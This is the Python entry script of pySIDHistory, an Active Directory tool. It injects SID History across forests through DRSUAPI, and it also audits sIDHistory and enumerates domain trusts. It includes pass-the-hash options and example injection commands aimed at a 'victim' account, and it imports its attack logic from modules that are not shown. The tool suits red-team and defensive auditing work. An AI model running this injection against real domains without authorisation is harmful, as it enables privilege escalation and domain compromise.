#!/usr/bin/env python3
"""
pySIDHistory - Remote SID History Attack & Audit Tool

The first tool to perform SID History injection from a distant
UNIX-like machine, combining LDAP and DRSUAPI (MS-DRSR opnum 20).

Author: @felixbillieres
License: MIT
"""

import argparse
import sys
import logging
from typing import Optional

from core import SIDHistoryAttack, AuthenticationManager
from core.output import OutputFormatter


BANNER = r"""
             _____  _____ ____  _   _ _     _
 _ __  _   _/ ____| |_ _||  _ \| | | (_)___| |_ ___  _ __ _   _
| '_ \| | | \___ \   | | | | | | |_| | / __| __/ _ \| '__| | | |
| |_) | |_| |___) |  | | | |_| |  _  | \__ \ || (_) | |  | |_| |
| .__/ \__, |____/  |___| |____/|_| |_|_|___/\__\___/|_|   \__, |
|_|    |___/                                                |___/
        Remote SID History Attack & Audit Tool
                                        @felixbillieres
"""


def setup_logging(verbose: bool = False, quiet: bool = False):
    """Configure logging."""
    if quiet:
        level = logging.CRITICAL
    elif verbose:
        level = logging.DEBUG
    else:
        level = logging.WARNING

    logging.basicConfig(
        level=level,
        format='[%(levelname)s] %(message)s',
        handlers=[logging.StreamHandler(sys.stderr)]
    )


def build_parser():
    """Build the argument parser."""
    parser = argparse.ArgumentParser(
        description='pySIDHistory - Remote SID History Attack & Audit Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
MODES:
  Inject:  Inject SID via DRSUAPI (--target + --source-user + --source-domain)
  Query:   Query sIDHistory of an object (--query)
  Lookup:  Lookup SID of an object (--lookup)
  Audit:   Full domain sIDHistory audit (--audit)
  Trusts:  Enumerate domain trusts (--enum-trusts)
  Presets: List well-known SID presets (--list-presets)

INJECTION:
  Uses DRSUAPI DRSAddSidHistory (opnum 20) — the same RPC call that
  Microsoft's ADMT uses for domain migrations. Requires cross-forest
  trust, auditing enabled on both DCs, and source domain credentials.

EXAMPLES:
  # Cross-forest SID injection via DRSUAPI
  %(prog)s -d DST.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
      --target victim --source-user admin --source-domain SRC.LOCAL \\
      --src-username admin --src-password Pass123 --src-domain SRC.LOCAL

  # Full domain audit
  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit

  # Query a user's sIDHistory
  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --query victim
        """
    )

    # ── Connection ──
    conn = parser.add_argument_group('Connection')
    conn.add_argument('-d', '--domain', required=True, help='Target domain (e.g., CORP.LOCAL)')
    conn.add_argument('-dc', '--dc-ip', required=True, help='Domain controller IP')
    conn.add_argument('--dc-hostname', help='DC hostname (for Kerberos/SSL)')
    conn.add_argument('--use-ssl', action='store_true', help='Use LDAPS (port 636)')

    # ── Authentication ──
    auth = parser.add_argument_group('Authentication')
    auth.add_argument('-u', '--username', help='Username')
    auth.add_argument('-p', '--password', help='Password')

    auth_methods = parser.add_mutually_exclusive_group()
    auth_methods.add_argument('--ntlm', action='store_true', help='NTLM auth (default)')
    auth_methods.add_argument('--ntlm-hash', metavar='HASH', help='Pass-the-Hash (LM:NT or NT)')
    auth_methods.add_argument('--kerberos', action='store_true', help='Kerberos auth')
    auth_methods.add_argument('--certificate', action='store_true', help='Client certificate auth')
    auth_methods.add_argument('--simple', action='store_true', help='SIMPLE bind')

    auth.add_argument('--ccache', help='Kerberos ccache file path')
    auth.add_argument('--cert-file', help='Client certificate (.pem)')
    auth.add_argument('--key-file', help='Client private key (.pem)')

    # ── Actions ──
    actions = parser.add_argument_group('Actions (pick one)')
    action_grp = actions.add_mutually_exclusive_group(required=True)
    action_grp.add_argument('--target', '--target-user', dest='target', help='Target object to modify')
    action_grp.add_argument('--query', '--query-user', dest='query', help='Query sIDHistory')
    action_grp.add_argument('--lookup', '--lookup-user', dest='lookup', help='Lookup SID')
    action_grp.add_argument('--audit', action='store_true', help='Full domain sIDHistory audit')
    action_grp.add_argument('--enum-trusts', action='store_true', help='Enumerate domain trusts')
    action_grp.add_argument('--list-presets', action='store_true', help='List available SID presets')

    # ── Injection options ──
    mods = parser.add_argument_group('Injection options (with --target)')
    mods.add_argument('--source-user', help='Source user whose SID to inject (via DRSUAPI)')
    mods.add_argument('--source-domain', help='Source domain (cross-forest injection)')

    # ── Source domain credentials (DRSUAPI cross-forest) ──
    src_creds = parser.add_argument_group('Source domain credentials (for DRSUAPI cross-forest)')
    src_creds.add_argument('--src-username', help='Username for source domain authentication')
    src_creds.add_argument('--src-password', help='Password for source domain authentication')
    src_creds.add_argument('--src-domain', help='Domain for source domain authentication (defaults to --source-domain)')

    # ── Output ──
    output = parser.add_argument_group('Output')
    output.add_argument('-o', '--output-format', choices=['console', 'json', 'csv'],
                       default='console', help='Output format (default: console)')
    output.add_argument('--no-color', action='store_true', help='Disable colored output')
    output.add_argument('--output-file', help='Write output to file')

    # ── Other ──
    other = parser.add_argument_group('Other')
    other.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    other.add_argument('-q', '--quiet', action='store_true', help='Quiet (warnings/errors only)')
    other.add_argument('--dry-run', action='store_true', help='Show what would be done without modifying')
    other.add_argument('--no-banner', action='store_true', help='Suppress banner')

    return parser


def determine_auth_method(args) -> str:
    """Determine authentication method from args."""
    if args.ntlm_hash:
        return AuthenticationManager.AUTH_NTLM_HASH
    elif args.kerberos:
        return AuthenticationManager.AUTH_KERBEROS
    elif args.certificate:
        return AuthenticationManager.AUTH_CERTIFICATE
    elif args.simple:
        return AuthenticationManager.AUTH_SIMPLE
    return AuthenticationManager.AUTH_NTLM


def validate_arguments(args, auth_method: str, parser) -> bool:
    """Validate argument combinations."""
    if auth_method == AuthenticationManager.AUTH_NTLM:
        if not args.username or not args.password:
            parser.error("NTLM authentication requires -u/--username and -p/--password")

    elif auth_method == AuthenticationManager.AUTH_NTLM_HASH:
        if not args.username:
            parser.error("Pass-the-Hash requires -u/--username")

    elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
        if not args.cert_file or not args.key_file:
            parser.error("Certificate auth requires --cert-file and --key-file")

    elif auth_method == AuthenticationManager.AUTH_SIMPLE:
        if not args.username or not args.password:
            parser.error("SIMPLE auth requires -u/--username and -p/--password")

    # Target action validation
    if args.target:
        if not args.source_user:
            parser.error("--target requires --source-user and --source-domain for DRSUAPI injection")

        if args.source_user and not args.source_domain:
            parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")

    return True


def build_auth_params(args, auth_method: str) -> dict:
    """Build authentication parameters dict."""
    params = {'use_ssl': args.use_ssl, 'username': args.username, 'password': args.password}

    if auth_method == AuthenticationManager.AUTH_NTLM_HASH:
        params['nt_hash'] = args.ntlm_hash
    elif auth_method == AuthenticationManager.AUTH_KERBEROS:
        params['ccache_path'] = args.ccache
        params.pop('username', None)
        params.pop('password', None)
    elif auth_method == AuthenticationManager.AUTH_CERTIFICATE:
        params['cert_file'] = args.cert_file
        params['key_file'] = args.key_file
        params.pop('password', None)

    return params


def handle_query(attacker: SIDHistoryAttack, formatter: OutputFormatter, username: str):
    """Handle --query action."""
    sid_history = attacker.get_current_sid_history(username)
    object_sid = attacker.get_user_sid(username)
    print(formatter.format_sid_history(username, sid_history, object_sid))


def handle_lookup(attacker: SIDHistoryAttack, formatter: OutputFormatter, username: str):
    """Handle --lookup action."""
    sid = attacker.get_user_sid(username)
    if sid:
        print(formatter.format_sid_lookup(username, sid))
    else:
        print(f"\nObject '{username}' not found")


def handle_audit(attacker: SIDHistoryAttack, formatter: OutputFormatter):
    """Handle --audit action."""
    report = attacker.full_audit()
    if report:
        print(formatter.format_audit_report(report))
    else:
        logging.error("Audit failed")


def handle_trusts(attacker: SIDHistoryAttack, formatter: OutputFormatter):
    """Handle --enum-trusts action."""
    trusts = attacker.enumerate_trusts()
    print(formatter.format_trusts(trusts))


def handle_presets(attacker: SIDHistoryAttack, formatter: OutputFormatter):
    """Handle --list-presets action."""
    domain_sid = attacker.get_domain_sid()
    if domain_sid:
        print(formatter.format_presets(domain_sid))
    else:
        logging.error("Could not determine domain SID")


def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
                  args, dry_run: bool = False) -> bool:
    """Handle --target action (DRSUAPI injection)."""
    target = args.target

    if dry_run:
        source_sid = attacker.get_user_sid(args.source_user)
        print(f"[DRY-RUN] Would inject SID of {args.source_user}@{args.source_domain} into {target}")
        if source_sid:
            print(f"[DRY-RUN] Source SID: {source_sid}")
        print(f"[DRY-RUN] Method: DRSUAPI (DRSAddSidHistory opnum 20)")
        return True

    src_creds_user = getattr(args, 'src_username', '') or ''
    src_creds_password = getattr(args, 'src_password', '') or ''
    src_creds_domain = getattr(args, 'src_domain', '') or args.source_domain or ''
    success = attacker.inject_sid_history(
        target, args.source_user,
        source_domain=args.source_domain,
        src_creds_user=src_creds_user,
        src_creds_domain=src_creds_domain,
        src_creds_password=src_creds_password,
    )

    if success:
        print(f"\n[+] sIDHistory modified successfully")
        # Show updated history
        updated = attacker.get_current_sid_history(target)
        if updated:
            print(formatter.format_sid_history(target, updated))

    return success


def main():
    """Main entry point."""
    parser = build_parser()
    args = parser.parse_args()

    setup_logging(args.verbose, args.quiet)

    if not args.no_banner and not args.quiet and args.output_format == 'console':
        print(BANNER, file=sys.stderr)

    auth_method = determine_auth_method(args)
    validate_arguments(args, auth_method, parser)

    # Handle --list-presets without auth (just needs domain SID format)
    if args.list_presets:
        # Still need to connect to get domain SID
        pass

    # Initialize
    attacker = SIDHistoryAttack(
        dc_ip=args.dc_ip,
        domain=args.domain,
        dc_hostname=args.dc_hostname
    )

    # Authenticate
    auth_params = build_auth_params(args, auth_method)
    if not attacker.authenticate(auth_method, **auth_params):
        logging.error("Authentication failed")
        sys.exit(1)

    # Setup formatter
    formatter = OutputFormatter(
        format_type=args.output_format,
        no_color=args.no_color,
        domain_sid=attacker.get_domain_sid()
    )

    # Output redirect
    output_file = None
    if args.output_file:
        try:
            output_file = open(args.output_file, 'w')
            # Redirect print to file
            import builtins
            original_print = builtins.print
            def file_print(*a, **kw):
                kw['file'] = output_file
                original_print(*a, **kw)
            builtins.print = file_print
        except Exception as e:
            logging.error(f"Cannot open output file: {e}")

    try:
        # ── Execute action ──
        if args.query:
            handle_query(attacker, formatter, args.query)

        elif args.lookup:
            handle_lookup(attacker, formatter, args.lookup)

        elif args.audit:
            handle_audit(attacker, formatter)

        elif args.enum_trusts:
            handle_trusts(attacker, formatter)

        elif args.list_presets:
            handle_presets(attacker, formatter)

        elif args.target:
            success = handle_target(attacker, formatter, args, dry_run=args.dry_run)
            sys.exit(0 if success else 1)

    except KeyboardInterrupt:
        logging.info("\nCancelled by user")
        sys.exit(130)
    except Exception as e:
        logging.error(f"Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        attacker.disconnect()
        if output_file:
            output_file.close()
            import builtins
            builtins.print = original_print


if __name__ == '__main__':
    main()
